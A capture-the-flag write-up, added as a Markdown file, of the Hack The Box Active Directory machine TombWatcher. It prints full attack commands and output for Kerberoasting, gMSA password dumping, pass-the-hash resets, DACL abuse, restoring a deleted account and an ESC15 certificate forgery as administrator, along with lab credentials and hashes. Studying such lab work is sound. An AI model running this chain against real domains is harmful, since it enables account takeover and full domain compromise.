@@ -1,0 +1,161 @@
+Title: TombWatcher
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+TombWatcher was a Windows Active Directory box that turned into an unusually long chain of BloodHound-mapped object-control abuses, starting from a single set of given low-privilege credentials (`henry`) and ending in full domain compromise via Active Directory Certificate Services. Each step unlocked the next principal in the chain: a targeted Kerberoast recovered a service account's password, a self-add right pulled that account into a group with GMSA-password-read rights, reading the GMSA let a `ForceChangePassword` right be exercised via pass-the-hash, and a subsequent `WriteOwner`/DACL abuse allowed hijacking a user account by continually resetting its password. That user held `GenericAll` over what appeared to be an empty AD CS-related object, which turned out to be a deleted certificate-template administrator account sitting in the Deleted Objects container; restoring it and resetting its password exposed a certificate template vulnerable to ESC15, which was used to request a certificate impersonating `administrator` and complete the takeover.
+
+## Initial Access - Domain Enumeration as henry
+
+Starting credentials were provided for a low-privilege domain account:
+
+```
+henry / H3nry_987TGV!
+```
+
+BloodHound collection against the domain mapped out the object-control graph from that starting point:
+
+```
+> bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
+```
+
+This showed `henry` held `WriteSPN` rights over another account, `alfred`, the first link in the chain.
+
+## Targeted Kerberoasting - alfred
+
+`WriteSPN` allows setting a Service Principal Name on a target account, which makes that account roastable even if it wasn't already running a service, using the targeted Kerberoasting technique:
+
+```
+https://github.com/ShutdownRepo/targetedKerberoast
+```
+
+After syncing time against the DC, the tool was run directly against `alfred`:
+
+```
+> python targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
+[+] Printing hash for (Alfred)
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$34ec996f...
+[VERBOSE] SPN removed successfully for (Alfred)
+```
+
+Cracking the recovered TGS hash offline yielded `Alfred:basketball`.
+
+## Group Self-Add - INFRASTRUCTURE
+
+`alfred` had no remote-logon rights, but BloodHound showed the account held `AddSelf` over the `INFRASTRUCTURE` group. `AddSelf` lets a principal add itself directly to the target group:
+
+```
+> bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "Alfred"
+[+] Alfred added to INFRASTRUCTURE
+```
+
+## gMSA Password Extraction - ansible_dev$
+
+Membership in `INFRASTRUCTURE` carried `ReadGMSAPassword` rights over a group-managed service account, `ANSIBLE_DEV$`. Group-managed service accounts store their current password (encrypted) in an LDAP attribute readable by authorized principals, and tools like `gMSADumper` can pull and decrypt it directly:
+
+```
+> python gMSADumper.py -u Alfred -p "basketball" -d tombwatcher.htb
+ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
+ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
+ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
+```
+
+## ForceChangePassword via Pass-the-Hash - SAM
+
+`ansible_dev$` held `ForceChangePassword` rights over another account, `SAM`. That right can be exercised over RPC, and since only the NTLM hash for `ansible_dev$` had been recovered (not a plaintext password), the reset was performed via pass-the-hash:
+
+```
+> pth-net rpc password "SAM" 'Password123' -U "TOMBWATCHER/ANSIBLE_DEV$"%ffffffffffffffffffffffffffffffff:"1c37d00093dc2a5f25176bf2d474afdc" -S 10.10.11.72
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+```
+
+This set `SAM`'s password to a known value.
+
+## WriteOwner and DACL Abuse - Hijacking john
+
+`SAM` in turn held `WriteOwner` over the `john` account. Taking ownership and then granting a reset-password ACE on the object allowed a full password takeover of `john`, using impacket's owner and DACL editing tools:
+
+```
+> impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password123'
+[*] OwnerSid modified successfully!
+
+> impacket-dacledit -action write -rights 'ResetPassword' -principal sam -target john tombwatcher/sam:'Password123' -dc-ip 10.10.11.72
+[*] DACL modified successfully!
+
+> net rpc password "JOHN" 'Password123' -U "TOMBWATCHER/SAM"%'Password123' -S 10.10.11.72
+Success.
+
+> evil-winrm -i 10.10.11.72 -u john -p 'Password123'
+```
+
+This gave a shell and the user flag as `john`. Something on the box was independently resetting `john`'s password every few minutes, closing the session shortly after each login; the full chain from `ansible_dev$` onward was scripted into a single one-liner to make re-establishing access quick whenever that happened:
+
+```
+> pth-net rpc password "SAM" 'Password123' -U "TOMBWATCHER/ANSIBLE_DEV$"%ffffffffffffffffffffffffffffffff:"1c37d00093dc2a5f25176bf2d474afdc" -S 10.10.11.72 && impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password123' && impacket-dacledit -action write -rights 'ResetPassword' -principal sam -target john tombwatcher/sam:'Password123' -dc-ip 10.10.11.72 && net rpc password "JOHN" 'Password123' -U "TOMBWATCHER/SAM"%'Password123' -S 10.10.11.72 && evil-winrm -i 10.10.11.72 -u john -p 'Password123'
+```
+
+## Restoring a Deleted Object - cert_admin
+
+An initial `certipy find` pass as `john` against the certificate authority returned nothing interesting. BloodHound, however, showed `john` held `GenericAll` over an object named `ADCS`, which appeared to be empty. Checking Active Directory's Deleted Objects container revealed the reason: it wasn't a live object at all, but the tombstone of a previously deleted certificate-administration account:
+
+```
+v> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+```
+
+Three deleted objects named `cert_admin` turned up under different GUIDs; the most recently modified one (GUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf`) was restored and its password reset using `john`'s `GenericAll` rights:
+
+```
+v> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf -NewName cert_admin
+> bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u John -p 'Password123' set password cert_admin 'Password123'
+[+] Password changed successfully!
+```
+
+## ADCS ESC15 - Full Domain Compromise
+
+With `cert_admin` credentials in hand, `certipy find` against the CA now returned a usable result: a `WebServer` certificate template enrollable by `cert_admin`, with `EnrolleeSuppliesSubject` set and a schema version of 1, flagged as vulnerable to ESC15 (CVE-2024-49019), where an enrollee-suppliable subject on a schema-v1 template lets a requester specify arbitrary certificate attributes, including an alternate application policy, on an unpatched CA:
+
+```
+> certipy find -u 'cert_admin@tombwatcher.htb' -p 'Password123' -dc-ip '10.10.11.72' -text -enabled -hide-admins
+    Template Name                       : WebServer
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Schema Version                      : 1
+    [!] Vulnerabilities
+      ESC15                             : Enrollee supplies subject and schema version is 1.
+```
+
+A certificate was requested against that template with the subject UPN and SID of `administrator`, and the application policy overridden to Client Authentication so the resulting certificate could be used for domain logon rather than just server auth:
+
+```
+> certipy req \
+    -u 'cert_admin@tombwatcher.htb' -p 'Password123' \
+    -dc-ip '10.10.11.72' -target 'DC01.TOMBWATCHER.HTB' \
+    -ca 'tombwatcher-CA-1' -template 'WebServer' \
+    -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
+    -application-policies 'Client Authentication'
+[*] Got certificate with UPN 'administrator@tombwatcher.htb'
+[*] Saving certificate and private key to 'administrator.pfx'
+```
+
+The resulting certificate authenticated as `administrator` over PKINIT, and an LDAP shell obtained through it was used to reset the account's password outright:
+
+```
+> certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
+v> change_password administrator Password123
+Password changed successfully!
+
+> evil-winrm -i 10.10.11.72 -u administrator -p 'Password123'
+```
+
+This granted a full administrative shell on the domain controller.
+
+## Takeaways
+
+- A single low-privilege credential is often enough to start a long chain of BloodHound-mapped ACL abuses; each hop (WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner) unlocks the next, and none of them individually look like a "big" vulnerability.
+- `WriteSPN` turns targeted Kerberoasting into a viable attack even against accounts that weren't already service accounts, since the attacker can set the SPN themselves before roasting.
+- Group-managed service account passwords are only as protected as the ACL on `ReadGMSAPassword`; any principal (or group) granted that right can pull and decrypt the current password non-interactively.
+- Pass-the-hash isn't limited to authentication; RPC-based rights like `ForceChangePassword` can be exercised with just an NTLM hash, no plaintext password required.
+- `WriteOwner` combined with DACL editing is a two-step but very general primitive: take ownership, then grant yourself whatever right (like `ResetPassword`) you actually need on the object.
+- Deleted AD objects aren't gone until they're garbage-collected from the tombstone/Deleted Objects container; if a compromised principal holds rights over what looks like an "empty" object, checking `Get-ADObject -IncludeDeletedObjects` can reveal it's actually a restorable account.
+- ESC15/CVE-2024-49019 shows that AD CS template versioning still matters even on templates that look benign at first glance; an enrollee-suppliable subject on a schema-v1 template on an unpatched CA can be abused to mint a certificate for any identity, including built-in Administrator, from a low-privileged enrollment right.
